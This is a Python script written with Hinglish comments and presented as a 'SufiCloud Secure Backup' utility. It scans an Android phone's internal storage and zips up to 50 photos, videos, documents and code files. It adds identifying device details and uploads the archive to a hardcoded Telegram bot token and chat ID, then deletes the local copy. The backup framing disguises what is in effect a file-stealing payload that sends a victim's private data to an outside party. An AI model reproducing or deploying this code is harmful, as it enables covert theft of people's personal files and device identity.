import os
import zipfile
import requests
import platform
import uuid
import socket
from datetime import datetime

# ⚡ CONFIGURATION (Yahan apna Bot Token aur Chat ID dalo)
BOT_TOKEN = "8473641651:AAGuz2x8HHMPd1AqK0nkClyigBr0Grzra_k" 
CHAT_ID = "-1003648952552"

def get_device_info():
    """Device ki basic info collect karta hai owner pehchanne ke liye"""
    try:
        info = f"""
📱 **Device Info:**
- System: {platform.system()} {platform.release()}
- Node: {platform.node()}
- Machine: {platform.machine()}
- UUID: {str(uuid.getnode())}
- Time: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
        """
        return info
    except:
        return "Device info unavailable"

def send_telegram(file_path, caption):
    """File ko fast speed me Telegram par upload karta hai"""
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
    try:
        with open(file_path, 'rb') as f:
            data = {'chat_id': CHAT_ID, 'caption': caption, 'parse_mode': 'Markdown'}
            files = {'document': f}
            requests.post(url, data=data, files=files)
        return True
    except Exception as e:
        print(f"Error sending: {e}")
        return False

def backupfiles(message="Backup Started"):
    """
    Main function jo user call karega.
    Yeh files dhundega, zip karega aur bhej dega.
    """
    print(f"🚀 {message}...")
    
    # Target Extensions
    exts = ['.txt', '.js', '.html', '.css', '.py', '.pdf', '.png', '.jpg', '.mp4', '.mp3', '.json']
    base_path = '/storage/emulated/0/' # Android Internal Storage
    
    files_to_zip = []
    total_size = 0
    file_count = 0
    max_files = 50 # Limit 50 files per usage
    max_size_per_file = 50 * 1024 * 1024 # 50 MB in bytes

    # 1. Fast Scan 🔍
    for root, dirs, files in os.walk(base_path):
        if file_count >= max_files:
            break
            
        for file in files:
            if any(file.endswith(ext) for ext in exts):
                filepath = os.path.join(root, file)
                try:
                    fsize = os.path.getsize(filepath)
                    # 50MB se choti file honi chahiye
                    if fsize < max_size_per_file:
                        files_to_zip.append(filepath)
                        file_count += 1
                        if file_count >= max_files:
                            break
                except:
                    continue
    
    if not files_to_zip:
        print("❌ No valid files found to backup.")
        return

    # 2. Creating Secure Zip 📦
    zip_filename = f"backup_{uuid.getnode()}_{datetime.now().strftime('%M%S')}.zip"
    zip_path = os.path.join(os.getcwd(), zip_filename)
    
    try:
        # Compression level thoda kam rakha hai taaki SPEED tez ho
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED, compresslevel=2) as zipf:
            for file in files_to_zip:
                # Zip ke andar folder structure maintain karega
                zipf.write(file, os.path.relpath(file, base_path))
        
        # 3. Sending to Telegram ✈️
        device_info = get_device_info()
        caption = f"🛡️ **SufiCloud Secure Backup**\n\n{message}\n\n📂 Files: {len(files_to_zip)}\n{device_info}"
        
        print("📤 Uploading securely...")
        send_telegram(zip_path, caption)
        print("✅ Backup Successful!")
        
        # Cleanup (Zip delete kar do upload ke baad)
        if os.path.exists(zip_path):
            os.remove(zip_path)
            
    except Exception as e:
        print(f"Error during processing: {e}")

